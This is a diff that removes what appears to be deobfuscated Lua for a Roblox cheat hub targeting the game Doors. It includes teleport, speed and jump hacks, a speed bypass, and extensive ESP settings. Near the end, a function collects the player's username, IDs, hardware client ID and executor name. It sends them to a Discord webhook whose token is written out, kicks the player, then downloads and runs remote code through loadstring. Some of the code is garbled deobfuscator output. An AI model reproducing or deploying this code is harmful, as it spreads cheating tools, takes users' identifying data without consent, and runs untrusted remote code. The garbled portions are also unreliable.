-        local _Players2331 = game:GetService("Players")
-        local _2332 = _Players2331.LocalPlayer
-        _2330(_TeleportService2329, game.PlaceId, _2332)
-    end)
-    local _2334 = _2313.Button
-    _2334(_2313, {
-        ButtonName = "Give Item",
-        Title = "Click TP",
-        Description = "Giving You Item",
-    }, function(_2336, _2336_2, _2336_3)
-        local _2337 = game.Players.LocalPlayer
-        local _2338 = _2337.GetMouse
-        local _2339 = _2338(_2337)
-        local _2340 = Instance.new
-        local _2341 = _2340("Tool")
-        _2341.RequiresHandle = false
-        _2341.Name = "Click TP"
-        local _2342 = _2341.Activated
-        local _2343 = _2342.connect
-        _2343(_2342, function(_2345, _2345_2, _2345_3)
-            local _2346 = _2339.Hit
-            local _2347 = Vector3.new
-            local _2348 = _2347(0, 2.5, 0)
-            local _2349 = _2346 + _2348
-            local _2350 = CFrame.new
-            local _2351 = _2349.X
-            local _2352 = _2349.Y
-            local _2353 = _2349.Z
-            local _2354 = _2350(_2351, _2352, _2353)
-            local _2355 = game.Players.LocalPlayer
-            local _2356 = _2355.Character
-            local _2357 = _2356.HumanoidRootPart
-            _2357.CFrame = _2354
-        end)
-        local _2358 = game.Players.LocalPlayer
-        local _2359 = _2358.Backpack
-        _2341.Parent = _2359
-    end)
-    local _2360 = _2311.Section
-    local _2361 = _2360(_2311, "Property Multiplier", "Right")
-    local _2362 = _2361.Slider
-    local _2363 = game.Players.LocalPlayer
-    local _2364 = _2363.Character
-    local _2365 = _2364.Humanoid
-    local _2366 = _2365.JumpPower
-    _2362(_2361, {
-        Min = 1,
-        Title = "Jump Power",
-        Max = 500,
-        Default = _2366,
-        Description = "",
-    }, function(_2368, _2368_2, _2368_3)
-        local _2369 = game.Players.LocalPlayer
-        local _2370 = _2369.Character
-        local _2371 = _2370.FindFirstChild
-        _2371(_2370, "Humanoid")
-        local _2373 = game.Players.LocalPlayer
-        local _2374 = _2373.Character
-        local _2375 = _2374.Humanoid
-        local _2376, _2376_2, _2376_3 = math.floor(_2368)
-        _2375.JumpPower = _2376
-    end)
-    local _2377 = _2361.Slider
-    local _2378 = game.Players.LocalPlayer
-    local _2379 = _2378.Character
-    local _2380 = _2379.Humanoid
-    local _2381 = _2380.WalkSpeed
-    _2377(_2361, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 500,
-        Default = _2381,
-        Description = "",
-    }, function(_2383, _2383_2, _2383_3)
-        local _2384 = game.Players.LocalPlayer
-        local _2385 = _2384.Character
-        local _2386 = _2385.FindFirstChild
-        _2386(_2385, "Humanoid")
-        local _2388 = game.Players.LocalPlayer
-        local _2389 = _2388.Character
-        local _2390 = _2389.Humanoid
-        local _2391, _2391_2, _2391_3 = math.floor(_2383)
-        _2390.WalkSpeed = _2391
-    end)
-    local _2392 = Instance.new
-    local _2393 = _2392("ScreenGui", game.CoreGui)
-    local _2394 = Instance.new
-    local _2395 = _2394("TextButton")
-    _2395.BackgroundTransparency = 1
-    local _2396 = UDim2.new
-    local _2397 = _2396(0, 0, 0, 0)
-    _2395.Size = _2397
-    _2395.Text = " "
-    _2395.Parent = _2393
-    local _2398 = Instance.new
-    local _2399 = _2398("ScreenGui", game.CoreGui)
-    _2399.Name = "BackgroundScreenGui"
-    _2399.Enabled = true
-    local _2400 = Instance.new
-    local _2401 = _2400("TextLabel", _2399)
-    _2401.Name = "BackgroundLabel"
-    local _2402 = Instance.new
-    local _2403 = _2402("UIGradient", _2401)
-    _2403.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _2450
-fenv.backgroundgradientcolor2 = _2452
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _2454
-fenv.customshadowcolor = _2456
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.speedbypass = false
-fenv.eternaljump = false
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 0
-fenv.oxygenchanger = false
-fenv.customoxygen = 100
-fenv.delayoptimization = 0.5
-fenv.instantprompt = false
-fenv.noseekobstructions = false
-fenv.antisnare = false
-fenv.antisnarewasused = false
-fenv.antisnareb = nil
-fenv.antihearing = false
-fenv.antistun = false
-fenv.antieyes = false
-fenv.antiscreech = false
-fenv.ambushnotify = false
-fenv.rushnotify = false
-fenv.eyesnotify = false
-fenv.lightstatus = false
-fenv.lightshadows = false
-fenv.lightbrightness = 1
-fenv.lightrange = 60
-fenv.lightcolor = _2458
-fenv.originalfogcolor = _2459
-fenv.customfogcolor = _2461
-fenv.originalfogend = _2462
-fenv.customfogend = 1000
-fenv.originalfogstart = _2463
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.doorfakechamsstatus = false
-fenv.doorfakechamsoutlinecolora = _2465
-fenv.doorfakechamsfillingcolora = _2467
-fenv.doorfakechamsoutlinetransparencya = 0
-fenv.doorfakechamsfillingtransparencya = 0.9
-fenv.doorrealchamsstatus = false
-fenv.doorrealchamsoutlinecolora = _2469
-fenv.doorrealchamsfillingcolora = _2471
-fenv.doorrealchamsoutlinetransparencya = 0
-fenv.doorrealchamsfillingtransparencya = 0.9
-fenv.leverchamsstatus = false
-fenv.leverchamsoutlinecolora = _2473
-fenv.leverchamsfillingcolora = _2475
-fenv.leverchamsoutlinetransparencya = 0
-fenv.leverchamsfillingtransparencya = 0.9
-fenv.snarechamsstatus = false
-fenv.snarechamsoutlinecolora = _2477
-fenv.snarechamsfillingcolora = _2479
-fenv.snarechamsoutlinetransparencya = 0
-fenv.snarechamsfillingtransparencya = 0.9
-fenv.rushchamsstatus = false
-fenv.rushchamsoutlinecolora = _2481
-fenv.rushchamsfillingcolora = _2483
-fenv.rushchamsoutlinetransparencya = 0
-fenv.rushchamsfillingtransparencya = 0.9
-fenv.ambushchamsstatus = false
-fenv.ambushchamsoutlinecolora = _2485
-fenv.ambushchamsfillingcolora = _2487
-fenv.ambushchamsoutlinetransparencya = 0
-fenv.ambushchamsfillingtransparencya = 0.9
-fenv.eyeschamsstatus = false
-fenv.eyeschamsoutlinecolora = _2489
-fenv.eyeschamsfillingcolora = _2491
-fenv.eyeschamsoutlinetransparencya = 0
-fenv.eyeschamsfillingtransparencya = 0.9
-fenv.figurechamsstatus = false
-fenv.figurechamsoutlinecolora = _2493
-fenv.figurechamsfillingcolora = _2495
-fenv.figurechamsoutlinetransparencya = 0
-fenv.figurechamsfillingtransparencya = 0.9
-fenv.toolshedchamsstatus = false
-fenv.toolshedchamsoutlinecolora = _2497
-fenv.toolshedchamsfillingcolora = _2499
-fenv.toolshedchamsoutlinetransparencya = 0
-fenv.toolshedchamsfillingtransparencya = 0.9
-fenv.chestchamsstatus = false
-fenv.chestchamsoutlinecolora = _2501
-fenv.chestchamsfillingcolora = _2503
-fenv.chestchamsoutlinetransparencya = 0
-fenv.chestchamsfillingtransparencya = 0.9
-fenv.lockedchestchamsstatus = false
-fenv.lockedchestchamsoutlinecolora = _2505
-fenv.lockedchestchamsfillingcolora = _2507
-fenv.lockedchestchamsoutlinetransparencya = 0
-fenv.lockedchestchamsfillingtransparencya = 0.9
-fenv.keychamsstatus = false
-fenv.keychamsoutlinecolora = _2509
-fenv.keychamsfillingcolora = _2511
-fenv.keychamsoutlinetransparencya = 0
-fenv.keychamsfillingtransparencya = 0.9
-fenv.bookchamsstatus = false
-fenv.bookchamsoutlinecolora = _2513
-fenv.bookchamsfillingcolora = _2515
-fenv.bookchamsoutlinetransparencya = 0
-fenv.bookchamsfillingtransparencya = 0.9
-fenv.bandagechamsstatus = false
-fenv.bandagechamsoutlinecolora = _2517
-fenv.bandagechamsfillingcolora = _2519
-fenv.bandagechamsoutlinetransparencya = 0
-fenv.bandagechamsfillingtransparencya = 0.9
-fenv.goldchamsstatus = false
-fenv.goldchamsoutlinecolora = _2521
-fenv.goldchamsfillingcolora = _2523
-fenv.goldchamsoutlinetransparencya = 0
-fenv.goldchamsfillingtransparencya = 0.9
-fenv.batterychamsstatus = false
-fenv.batterychamsoutlinecolora = _2525
-fenv.batterychamsfillingcolora = _2527
-fenv.batterychamsoutlinetransparencya = 0
-fenv.batterychamsfillingtransparencya = 0.9
-fenv.lighterchamsstatus = false
-fenv.lighterchamsoutlinecolora = _2529
-fenv.lighterchamsfillingcolora = _2531
-fenv.lighterchamsoutlinetransparencya = 0
-fenv.lighterchamsfillingtransparencya = 0.9
-fenv.breakerchamsstatus = false
-fenv.breakerchamsoutlinecolora = _2533
-fenv.breakerchamsfillingcolora = _2535
-fenv.breakerchamsoutlinetransparencya = 0
-fenv.breakerchamsfillingtransparencya = 0.9
-fenv.rushespstatus = false
-fenv.namerushespstatus = false
-fenv.distancerushespstatus = false
-fenv.enabledrushoutline = true
-fenv.textsizenamerusha = 8
-fenv.namerushespcolora = _2537
-fenv.rushespoffseta = 0.5
-fenv.fontnamerushesp = "Montserrat"
-fenv.ambushespstatus = false
-fenv.nameambushespstatus = false
-fenv.distanceambushespstatus = false
-fenv.enabledambushoutline = true
-fenv.textsizenameambusha = 8
-fenv.nameambushespcolora = _2539
-fenv.ambushespoffseta = 0.5
-fenv.fontnameambushesp = "Montserrat"
-fenv.eyesespstatus = false
-fenv.nameeyesespstatus = false
-fenv.distanceeyesespstatus = false
-fenv.enabledeyesoutline = true
-fenv.textsizenameeyesa = 8
-fenv.nameeyesespcolora = _2541
-fenv.eyesespoffseta = 0.5
-fenv.fontnameeyesesp = "Montserrat"
-fenv.figureespstatus = false
-fenv.namefigureespstatus = false
-fenv.distancefigureespstatus = false
-fenv.enabledfigureoutline = true
-fenv.textsizenamefigurea = 8
-fenv.namefigureespcolora = _2543
-fenv.figureespoffseta = 0.5
-fenv.fontnamefigureesp = "Montserrat"
-fenv.doorrealespstatus = false
-fenv.namedoorrealespstatus = false
-fenv.distancedoorrealespstatus = false
-fenv.enableddoorrealoutline = true
-fenv.textsizenamedoorreala = 8
-fenv.namedoorrealespcolora = _2545
-fenv.doorrealespoffseta = 0.5
-fenv.fontnamedoorrealesp = "Montserrat"
-fenv.doorfakeespstatus = false
-fenv.namedoorfakeespstatus = false
-fenv.distancedoorfakeespstatus = false
-fenv.enableddoorfakeoutline = true
-fenv.textsizenamedoorfakea = 8
-fenv.namedoorfakeespcolora = _2547
-fenv.doorfakeespoffseta = 0.5
-fenv.fontnamedoorfakeesp = "Montserrat"
-fenv.leverespstatus = false
-fenv.nameleverespstatus = false
-fenv.distanceleverespstatus = false
-fenv.enabledleveroutline = true
-fenv.textsizenamelevera = 8
-fenv.nameleverespcolora = _2549
-fenv.leverespoffseta = 0.5
-fenv.fontnameleveresp = "Montserrat"
-fenv.snareespstatus = false
-fenv.namesnareespstatus = false
-fenv.distancesnareespstatus = false
-fenv.enabledsnareoutline = true
-fenv.textsizenamesnarea = 8
-fenv.namesnareespcolora = _2551
-fenv.snareespoffseta = 0.5
-fenv.fontnamesnareesp = "Montserrat"
-fenv.bandageespstatus = false
-fenv.namebandageespstatus = false
-fenv.distancebandageespstatus = false
-fenv.enabledbandageoutline = true
-fenv.textsizenamebandagea = 8
-fenv.namebandageespcolora = _2553
-fenv.bandageespoffseta = 0.5
-fenv.fontnamebandageesp = "Montserrat"
-fenv.keyespstatus = false
-fenv.namekeyespstatus = false
-fenv.distancekeyespstatus = false
-fenv.enabledkeyoutline = true
-fenv.textsizenamekeya = 8
-fenv.namekeyespcolora = _2555
-fenv.keyespoffseta = 0.5
-fenv.fontnamekeyesp = "Montserrat"
-fenv.bookespstatus = false
-fenv.namebookespstatus = false
-fenv.distancebookespstatus = false
-fenv.enabledbookoutline = true
-fenv.textsizenamebooka = 8
-fenv.namebookespcolora = _2557
-fenv.bookespoffseta = 0.5
-fenv.fontnamebookesp = "Montserrat"
-fenv.goldespstatus = false
-fenv.namegoldespstatus = false
-fenv.distancegoldespstatus = false
-fenv.enabledgoldoutline = true
-fenv.textsizenamegolda = 8
-fenv.namegoldespcolora = _2559
-fenv.goldespoffseta = 0.5
-fenv.fontnamegoldesp = "Montserrat"
-fenv.batteryespstatus = false
-fenv.namebatteryespstatus = false
-fenv.distancebatteryespstatus = false
-fenv.enabledbatteryoutline = true
-fenv.textsizenamebatterya = 8
-fenv.namebatteryespcolora = _2561
-fenv.batteryespoffseta = 0.5
-fenv.fontnamebatteryesp = "Montserrat"
-fenv.lighterespstatus = false
-fenv.namelighterespstatus = false
-fenv.distancelighterespstatus = false
-fenv.enabledlighteroutline = true
-fenv.textsizenamelightera = 8
-fenv.namelighterespcolora = _2563
-fenv.lighterespoffseta = 0.5
-fenv.fontnamelighteresp = "Montserrat"
-fenv.breakerespstatus = false
-fenv.namebreakerespstatus = false
-fenv.distancebreakerespstatus = false
-fenv.enabledbreakeroutline = true
-fenv.textsizenamebreakera = 8
-fenv.namebreakerespcolora = _2565
-fenv.breakerespoffseta = 0.5
-fenv.fontnamebreakeresp = "Montserrat"
-fenv.chestespstatus = false
-fenv.namechestespstatus = false
-fenv.distancechestespstatus = false
-fenv.enabledchestoutline = true
-fenv.textsizenamechesta = 8
-fenv.namechestespcolora = _2567
-fenv.chestespoffseta = 0.5
-fenv.fontnamechestesp = "Montserrat"
-fenv.lockedchestespstatus = false
-fenv.namelockedchestespstatus = false
-fenv.distancelockedchestespstatus = false
-fenv.enabledlockedchestoutline = true
-fenv.textsizenamelockedchesta = 8
-fenv.namelockedchestespcolora = _2569
-fenv.lockedchestespoffseta = 0.5
-fenv.fontnamelockedchestesp = "Montserrat"
-fenv.toolshedespstatus = false
-fenv.nametoolshedespstatus = false
-fenv.distancetoolshedespstatus = false
-fenv.enabledtoolshedoutline = true
-fenv.textsizenametoolsheda = 8
-fenv.nametoolshedespcolora = _2571
-fenv.toolshedespoffseta = 0.5
-fenv.fontnametoolshedesp = "Montserrat"
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.antistun = _2604
-fenv.antisnare = _2607
-fenv.antihearing = _2610
-fenv.antieyes = _2613
-fenv.antiscreech = _2616
-fenv.noseekobstructions = _2619
-fenv.instantprompt = _2624
-fenv.delayoptimization = _2629
-fenv.eyesnotify = _2636
-fenv.rushnotify = _2639
-fenv.ambushnotify = _2642
-fenv.changefogstatus = _2649
-fenv.customfogend = _2653
-fenv.customfogstart = _2657
-fenv.b = _2661
-fenv.g = _2660
-fenv.r = _2659
-fenv.customfogcolor = _2666
-fenv.lightstatus = _2671
-fenv.lightshadows = _2674
-fenv.lightrange = _2678
-fenv.lightbrightness = _2683
-fenv.b = _2687
-fenv.g = _2686
-fenv.r = _2685
-fenv.lightcolor = _2692
-fenv.doorrealchamsstatus = _2699
-fenv.doorrealchamsoutlinetransparencya = _2704
-fenv.b = _2708
-fenv.g = _2707
-fenv.r = _2706
-fenv.doorrealchamsoutlinecolora = _2713
-fenv.doorrealchamsfillingtransparencya = _2718
-fenv.b = _2722
-fenv.g = _2721
-fenv.r = _2720
-fenv.doorrealchamsfillingcolora = _2727
-fenv.doorrealespstatus = _2732
-fenv.doorrealespoffseta = _2737
-fenv.enableddoorrealoutline = _2740
-fenv.namedoorrealespstatus = _2743
-fenv.distancedoorrealespstatus = _2746
-fenv.textsizenamedoorreala = _2750
-fenv.b = _2754
-fenv.g = _2753
-fenv.r = _2752
-fenv.namedoorrealespcolora = _2759
-fenv.doorfakechamsstatus = _2764
-fenv.doorfakechamsoutlinetransparencya = _2769
-fenv.b = _2773
-fenv.g = _2772
-fenv.r = _2771
-fenv.doorfakechamsoutlinecolora = _2778
-fenv.doorfakechamsfillingtransparencya = _2783
-fenv.b = _2787
-fenv.g = _2786
-fenv.r = _2785
-fenv.doorfakechamsfillingcolora = _2792
-fenv.doorfakeespstatus = _2797
-fenv.doorfakeespoffseta = _2802
-fenv.enableddoorfakeoutline = _2805
-fenv.namedoorfakeespstatus = _2808
-fenv.distancedoorfakeespstatus = _2811
-fenv.textsizenamedoorfakea = _2815
-fenv.b = _2819
-fenv.g = _2818
-fenv.r = _2817
-fenv.namedoorfakeespcolora = _2824
-fenv.leverchamsstatus = _2829
-fenv.leverchamsoutlinetransparencya = _2834
-fenv.b = _2838
-fenv.g = _2837
-fenv.r = _2836
-fenv.leverchamsoutlinecolora = _2843
-fenv.leverchamsfillingtransparencya = _2848
-fenv.b = _2852
-fenv.g = _2851
-fenv.r = _2850
-fenv.leverchamsfillingcolora = _2857
-fenv.leverespstatus = _2862
-fenv.leverespoffseta = _2867
-fenv.enabledleveroutline = _2870
-fenv.nameleverespstatus = _2873
-fenv.distanceleverespstatus = _2876
-fenv.textsizenamelevera = _2880
-fenv.b = _2884
-fenv.g = _2883
-fenv.r = _2882
-fenv.nameleverespcolora = _2889
-fenv.snarechamsstatus = _2894
-fenv.snarechamsoutlinetransparencya = _2899
-fenv.b = _2903
-fenv.g = _2902
-fenv.r = _2901
-fenv.snarechamsoutlinecolora = _2908
-fenv.snarechamsfillingtransparencya = _2913
-fenv.b = _2917
-fenv.g = _2916
-fenv.r = _2915
-fenv.snarechamsfillingcolora = _2922
-fenv.snareespstatus = _2927
-fenv.snareespoffseta = _2932
-fenv.enabledsnareoutline = _2935
-fenv.namesnareespstatus = _2938
-fenv.distancesnareespstatus = _2941
-fenv.textsizenamesnarea = _2945
-fenv.b = _2949
-fenv.g = _2948
-fenv.r = _2947
-fenv.namesnareespcolora = _2954
-fenv.rushchamsstatus = _2961
-fenv.rushchamsoutlinetransparencya = _2966
-fenv.b = _2970
-fenv.g = _2969
-fenv.r = _2968
-fenv.rushchamsoutlinecolora = _2975
-fenv.rushchamsfillingtransparencya = _2980
-fenv.b = _2984
-fenv.g = _2983
-fenv.r = _2982
-fenv.rushchamsfillingcolora = _2989
-fenv.rushespstatus = _2994
-fenv.rushespoffseta = _2999
-fenv.enabledrushoutline = _3002
-fenv.namerushespstatus = _3005
-fenv.distancerushespstatus = _3008
-fenv.textsizenamerusha = _3012
-fenv.b = _3016
-fenv.g = _3015
-fenv.r = _3014
-fenv.namerushespcolora = _3021
-fenv.ambushchamsstatus = _3026
-fenv.ambushchamsoutlinetransparencya = _3031
-fenv.b = _3035
-fenv.g = _3034
-fenv.r = _3033
-fenv.ambushchamsoutlinecolora = _3040
-fenv.ambushchamsfillingtransparencya = _3045
-fenv.b = _3049
-fenv.g = _3048
-fenv.r = _3047
-fenv.ambushchamsfillingcolora = _3054
-fenv.ambushespstatus = _3059
-fenv.ambushespoffseta = _3064
-fenv.enabledambushoutline = _3067
-fenv.nameambushespstatus = _3070
-fenv.distanceambushespstatus = _3073
-fenv.textsizenameambusha = _3077
-fenv.b = _3081
-fenv.g = _3080
-fenv.r = _3079
-fenv.nameambushespcolora = _3086
-fenv.eyeschamsstatus = _3091
-fenv.eyeschamsoutlinetransparencya = _3096
-fenv.b = _3100
-fenv.g = _3099
-fenv.r = _3098
-fenv.eyeschamsoutlinecolora = _3105
-fenv.eyeschamsfillingtransparencya = _3110
-fenv.b = _3114
-fenv.g = _3113
-fenv.r = _3112
-fenv.eyeschamsfillingcolora = _3119
-fenv.eyesespstatus = _3124
-fenv.eyesespoffseta = _3129
-fenv.enabledeyesoutline = _3132
-fenv.nameeyesespstatus = _3135
-fenv.distanceeyesespstatus = _3138
-fenv.textsizenameeyesa = _3142
-fenv.b = _3146
-fenv.g = _3145
-fenv.r = _3144
-fenv.nameeyesespcolora = _3151
-fenv.figurechamsstatus = _3156
-fenv.figurechamsoutlinetransparencya = _3161
-fenv.b = _3165
-fenv.g = _3164
-fenv.r = _3163
-fenv.figurechamsoutlinecolora = _3170
-fenv.figurechamsfillingtransparencya = _3175
-fenv.b = _3179
-fenv.g = _3178
-fenv.r = _3177
-fenv.figurechamsfillingcolora = _3184
-fenv.figureespstatus = _3189
-fenv.figureespoffseta = _3194
-fenv.enabledfigureoutline = _3197
-fenv.namefigureespstatus = _3200
-fenv.distancefigureespstatus = _3203
-fenv.textsizenamefigurea = _3207
-fenv.b = _3211
-fenv.g = _3210
-fenv.r = _3209
-fenv.namefigureespcolora = _3216
-fenv.toolshedchamsstatus = _3223
-fenv.toolshedchamsoutlinetransparencya = _3228
-fenv.b = _3232
-fenv.g = _3231
-fenv.r = _3230
-fenv.toolshedchamsoutlinecolora = _3237
-fenv.toolshedchamsfillingtransparencya = _3242
-fenv.b = _3246
-fenv.g = _3245
-fenv.r = _3244
-fenv.toolshedchamsfillingcolora = _3251
-fenv.toolshedespstatus = _3256
-fenv.toolshedespoffseta = _3261
-fenv.enabledtoolshedoutline = _3264
-fenv.nametoolshedespstatus = _3267
-fenv.distancetoolshedespstatus = _3270
-fenv.textsizenametoolsheda = _3274
-fenv.b = _3278
-fenv.g = _3277
-fenv.r = _3276
-fenv.nametoolshedespcolora = _3283
-fenv.chestchamsstatus = _3288
-fenv.chestchamsoutlinetransparencya = _3293
-fenv.b = _3297
-fenv.g = _3296
-fenv.r = _3295
-fenv.chestchamsoutlinecolora = _3302
-fenv.chestchamsfillingtransparencya = _3307
-fenv.b = _3311
-fenv.g = _3310
-fenv.r = _3309
-fenv.chestchamsfillingcolora = _3316
-fenv.chestespstatus = _3321
-fenv.chestespoffseta = _3326
-fenv.enabledchestoutline = _3329
-fenv.namechestespstatus = _3332
-fenv.distancechestespstatus = _3335
-fenv.textsizenamechesta = _3339
-fenv.b = _3343
-fenv.g = _3342
-fenv.r = _3341
-fenv.namechestespcolora = _3348
-fenv.lockedchestchamsstatus = _3353
-fenv.lockedchestchamsoutlinetransparencya = _3358
-fenv.b = _3362
-fenv.g = _3361
-fenv.r = _3360
-fenv.lockedchestchamsoutlinecolora = _3367
-fenv.lockedchestchamsfillingtransparencya = _3372
-fenv.b = _3376
-fenv.g = _3375
-fenv.r = _3374
-fenv.lockedchestchamsfillingcolora = _3381
-fenv.lockedchestespstatus = _3386
-fenv.lockedchestespoffseta = _3391
-fenv.enabledlockedchestoutline = _3394
-fenv.namelockedchestespstatus = _3397
-fenv.distancelockedchestespstatus = _3400
-fenv.textsizenamelockedchesta = _3404
-fenv.b = _3408
-fenv.g = _3407
-fenv.r = _3406
-fenv.namelockedchestespcolora = _3413
-fenv.keychamsstatus = _3418
-fenv.keychamsoutlinetransparencya = _3423
-fenv.b = _3427
-fenv.g = _3426
-fenv.r = _3425
-fenv.keychamsoutlinecolora = _3432
-fenv.keychamsfillingtransparencya = _3437
-fenv.b = _3441
-fenv.g = _3440
-fenv.r = _3439
-fenv.keychamsfillingcolora = _3446
-fenv.keyespstatus = _3451
-fenv.keyespoffseta = _3456
-fenv.enabledkeyoutline = _3459
-fenv.namekeyespstatus = _3462
-fenv.distancekeyespstatus = _3465
-fenv.textsizenamekeya = _3469
-fenv.b = _3473
-fenv.g = _3472
-fenv.r = _3471
-fenv.namekeyespcolora = _3478
-fenv.bookchamsstatus = _3483
-fenv.bookchamsoutlinetransparencya = _3488
-fenv.b = _3492
-fenv.g = _3491
-fenv.r = _3490
-fenv.bookchamsoutlinecolora = _3497
-fenv.bookchamsfillingtransparencya = _3502
-fenv.b = _3506
-fenv.g = _3505
-fenv.r = _3504
-fenv.bookchamsfillingcolora = _3511
-fenv.bookespstatus = _3516
-fenv.bookespoffseta = _3521
-fenv.enabledbookoutline = _3524
-fenv.namebookespstatus = _3527
-fenv.distancebookespstatus = _3530
-fenv.textsizenamebooka = _3534
-fenv.b = _3538
-fenv.g = _3537
-fenv.r = _3536
-fenv.namebookespcolora = _3543
-fenv.breakerchamsstatus = _3548
-fenv.breakerchamsoutlinetransparencya = _3553
-fenv.b = _3557
-fenv.g = _3556
-fenv.r = _3555
-fenv.breakerchamsoutlinecolora = _3562
-fenv.breakerchamsfillingtransparencya = _3567
-fenv.b = _3571
-fenv.g = _3570
-fenv.r = _3569
-fenv.breakerchamsfillingcolora = _3576
-fenv.breakerespstatus = _3581
-fenv.breakerespoffseta = _3586
-fenv.enabledbreakeroutline = _3589
-fenv.namebreakerespstatus = _3592
-fenv.distancebreakerespstatus = _3595
-fenv.textsizenamebreakera = _3599
-fenv.b = _3603
-fenv.g = _3602
-fenv.r = _3601
-fenv.namebreakerespcolora = _3608
-fenv.lighterchamsstatus = _3613
-fenv.lighterchamsoutlinetransparencya = _3618
-fenv.b = _3622
-fenv.g = _3621
-fenv.r = _3620
-fenv.lighterchamsoutlinecolora = _3627
-fenv.lighterchamsfillingtransparencya = _3632
-fenv.b = _3636
-fenv.g = _3635
-fenv.r = _3634
-fenv.lighterchamsfillingcolora = _3641
-fenv.lighterespstatus = _3646
-fenv.lighterespoffseta = _3651
-fenv.enabledlighteroutline = _3654
-fenv.namelighterespstatus = _3657
-fenv.distancelighterespstatus = _3660
-fenv.textsizenamelightera = _3664
-fenv.b = _3668
-fenv.g = _3667
-fenv.r = _3666
-fenv.namelighterespcolora = _3673
-fenv.batterychamsstatus = _3678
-fenv.batterychamsoutlinetransparencya = _3683
-fenv.b = _3687
-fenv.g = _3686
-fenv.r = _3685
-fenv.batterychamsoutlinecolora = _3692
-fenv.batterychamsfillingtransparencya = _3697
-fenv.b = _3701
-fenv.g = _3700
-fenv.r = _3699
-fenv.batterychamsfillingcolora = _3706
-fenv.batteryespstatus = _3711
-fenv.batteryespoffseta = _3716
-fenv.enabledbatteryoutline = _3719
-fenv.namebatteryespstatus = _3722
-fenv.distancebatteryespstatus = _3725
-fenv.textsizenamebatterya = _3729
-fenv.b = _3733
-fenv.g = _3732
-fenv.r = _3731
-fenv.namebatteryespcolora = _3738
-fenv.goldchamsstatus = _3743
-fenv.goldchamsoutlinetransparencya = _3748
-fenv.b = _3752
-fenv.g = _3751
-fenv.r = _3750
-fenv.goldchamsoutlinecolora = _3757
-fenv.goldchamsfillingtransparencya = _3762
-fenv.b = _3766
-fenv.g = _3765
-fenv.r = _3764
-fenv.goldchamsfillingcolora = _3771
-fenv.goldespstatus = _3776
-fenv.goldespoffseta = _3781
-fenv.enabledgoldoutline = _3784
-fenv.namegoldespstatus = _3787
-fenv.distancegoldespstatus = _3790
-fenv.textsizenamegolda = _3794
-fenv.b = _3798
-fenv.g = _3797
-fenv.r = _3796
-fenv.namegoldespcolora = _3803
-fenv.bandagechamsstatus = _3808
-fenv.bandagechamsoutlinetransparencya = _3813
-fenv.b = _3817
-fenv.g = _3816
-fenv.r = _3815
-fenv.bandagechamsoutlinecolora = _3822
-fenv.bandagechamsfillingtransparencya = _3827
-fenv.b = _3831
-fenv.g = _3830
-fenv.r = _3829
-fenv.bandagechamsfillingcolora = _3836
-fenv.bandageespstatus = _3841
-fenv.bandageespoffseta = _3846
-fenv.enabledbandageoutline = _3849
-fenv.namebandageespstatus = _3852
-fenv.distancebandageespstatus = _3855
-fenv.textsizenamebandagea = _3859
-fenv.b = _3863
-fenv.g = _3862
-fenv.r = _3861
-fenv.namebandageespcolora = _3868
-fenv.eternaljump = _3905
-fenv.speedbypass = _3908
-fenv.walkspeedmultiplier = _3911
-fenv.walkspeedplayer = _3916
-fenv.oxygenchanger = _3919
-fenv.customoxygen = _3923
-fenv.doors1 = function(_2405, _2405_2, _2405_3)
-    local _2406 = game.Players.LocalPlayer
-    local _2407 = _2406.UserId
-    local _2408 = game.Players.LocalPlayer
-    local _2409 = _2408.DisplayName
-    local _2410 = game.Players.LocalPlayer
-    local _2411 = _2410.Name
-    local _RbxAnalyticsService2412 = game:GetService("RbxAnalyticsService")
-    local _2413 = _RbxAnalyticsService2412.GetClientId
-    local _2414 = _2413(_RbxAnalyticsService2412)
-    local _MarketplaceService2415 = game:GetService("MarketplaceService")
-    local _2416 = _MarketplaceService2415.GetProductInfo
-    local _2417 = _2416(_MarketplaceService2415, game.PlaceId)
-    local _2418 = _2417.Name
-    local _2419, _2419_2 = identifyexecutor()
-    local _2420, _2420_2, _2420_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _2407, _2409, _2411, _2407, _2414, "03/21/2025", "14:26:59", game.PlaceId, _2418, game.PlaceId, _2419)
-    local _2421 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _2407
-    local _2422 = _2421 .. "&width=150&height=150&format=png"
-    local _HttpService2423 = game:GetService("HttpService")
-    local _2424 = _HttpService2423.JSONEncode
-    local _2425 = _2424(_HttpService2423, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _2420,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _2422,
-                },
-            },
-        },
-    })
-    local _2426 = _2425.gsub
-    local _2427 = _2426(_2425, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _2427,
-    })
-    local _2429 = game.Players.LocalPlayer
-    local _2430 = _2429.Kick
-    _2430(_2429, "GOT YOU XD!")
-    local _2432 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _2433 = loadstring(_2432)
-    local _2434 = _2433()
-    local _2435 = _2434.new
